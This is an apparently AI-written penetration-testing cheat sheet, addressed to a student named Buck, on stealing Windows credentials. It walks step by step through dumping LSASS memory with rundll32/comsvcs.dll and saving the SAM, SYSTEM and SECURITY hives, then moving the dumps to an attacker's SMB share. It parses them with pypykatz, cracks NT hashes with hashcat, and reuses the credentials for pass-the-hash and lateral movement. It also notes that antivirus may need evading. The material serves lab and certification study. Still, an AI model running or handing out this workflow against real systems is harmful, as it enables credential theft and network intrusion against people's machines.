🧠 Concept Overview – Attacking LSASS
LSASS (Local Security Authority Subsystem Service) handles:

Credential caching

Creating access tokens

Writing to security logs

Attacking LSASS = pulling creds straight from memory. 🔥

Dump memory ➝ transfer file ➝ parse it offline ➝ crack NT hash

🧰 Methods to Dump LSASS Memory
🖱️ 1. GUI (Task Manager Method)
✅ Easy, but requires RDP or GUI shell.

Open Task Manager → Processes tab

Right click lsass.exe → Create Dump File

Saved as:

pgsql
Copy
Edit
C:\Users\<user>\AppData\Local\Temp\lsass.DMP
💻 2. Command Line (rundll32 + comsvcs.dll)
✅ Use when you only have CLI access (evil-winrm, reverse shell, etc.)

🔎 Get LSASS PID:
cmd
Copy
Edit
tasklist /svc
or

powershell
Copy
Edit
Get-Process lsass
📝 Create Dump File:
powershell
Copy
Edit
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
📦 Note: Modern AVs will block this — may require AV evasion.

🚚 Transfer to Attack Box
Use smbserver.py:

bash
Copy
Edit
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support loot /home/buck/lsass/
Then on Windows:

cmd
Copy
Edit
move C:\lsass.dmp \\<your-ip>\loot
🪬 Credential Extraction – pypykatz (Linux Mimikatz)
bash
Copy
Edit
pypykatz lsa minidump /home/buck/lsass/lsass.dmp
Key sections from output:

Section	Value
MSV	Contains NTLM hash! 🔥
WDIGEST	Clear-text password (if not patched)
Kerberos	Username, domain, sometimes tickets
DPAPI	Masterkeys to decrypt Chrome, IE, RDP saved creds
🔓 Cracking the NT Hash
bash
Copy
Edit
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
Output:

bash
Copy
Edit
64f12cddaa88057e06a81b54e73b949b:Password1
Use cracked password for:

RDP

WinRM

SMB login

Pivoting (reuse across domain)

🔁 Summary Workflow
text
Copy
Edit
[Got Admin Access?] 
        ↓
[Dump LSASS → Task Manager or Rundll32]
        ↓
[Transfer Dump to Kali → smbserver]
        ↓
[Parse w/ pypykatz → Extract NT hash]
        ↓
[Crack hash w/ hashcat -m 1000]
        ↓
[Use creds for access or lateral move]
🧠 Key Notes:
WDIGEST only shows cleartext on old OS versions or when enabled manually.

pypykatz is lightweight, cross-platform, doesn't need to be run on victim.

LSASS dumps are golden — even without cracking, NT hashes = PtH potential.

🔐 Why You Need Admin First
LSASS is a protected process. It's got:

System-level permissions

Credential gold mine (NT hashes, plaintext, Kerberos tickets, DPAPI keys)

👉 Without admin or SYSTEM, you:

❌ Can’t create memory dumps of LSASS

❌ Can’t access SAM/SECURITY/SYSTEM registry hives

❌ Can’t run mimikatz or rundll32-based dumping

❌ Can’t touch lsass.exe with PowerShell or CMD

🔓 Ways to Get Admin Access First
Local Privilege Escalation (like you're grinding in CPTS/HTB)

Service misconfigs

Unquoted paths

Weak permissions

Kernel exploits

Valid Admin Creds (cracked from SAM, RDP, SMB, Evil-WinRM)

Token Impersonation (e.g., from SeImpersonate + Potato chains)

Password Reuse / Stuffing after cracking one user

🧨 Then You Can:
🔸 Dump LSASS (rundll32, Task Manager)

🔸 Dump SAM + SYSTEM (reg save)

🔸 Use pypykatz or secretsdump.py

🔸 Crack with hashcat

🔸 Reuse creds or PtH to laterally move

🔍 SAM + SYSTEM + SECURITY Dumps:
You get this after you have admin access, usually from:

bash
Copy
Edit
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
What You Get:

🔐 NT hashes of local users (from SAM)

🔐 Cached domain creds (if domain-joined & offline logons were used) from SECURITY

Use secretsdump.py from Impacket to parse

Can be cracked offline or used in Pass-the-Hash attacks

📌 These are static creds stored on disk.

🧠 LSASS Dump (Memory) — lsass.dmp
Dumped from memory, not disk. Think of this like:

📸 A snapshot of everything actively logged in.

What You Might Pull from LSASS:

✅ NTLM hashes (from MSV auth provider)

✅ Cleartext passwords (only if WDIGEST is enabled, or from credential providers)

✅ Kerberos tickets for logged-on users

✅ DPAPI master keys (used for decrypting secrets)

✅ Web creds, Chrome/IE stored passwords, RDP creds, Outlook creds, VPN creds

✅ Tokens from running services, Scheduled Tasks, SYSTEM services

💥 LSASS = Live session data — stuff you can’t get from SAM.

🧠🔁 TL;DR — Which One Gets What?
Targeted Dump	Gives You...
SAM + SYSTEM	NT hashes of local accounts (offline, static)
SECURITY Hive	Cached domain creds (only if domain-joined and cached logons exist)
LSASS Memory	🔥 Cleartext creds (sometimes), Kerberos tickets, DPAPI master keys, web/RDP/VPN creds
So yeah Buck, if you're looking for creds beyond just user logins — like web creds, browser saved logins, or Outlook/VPN passwords —
💣 LSASS is where that juicy dynamic data lives.
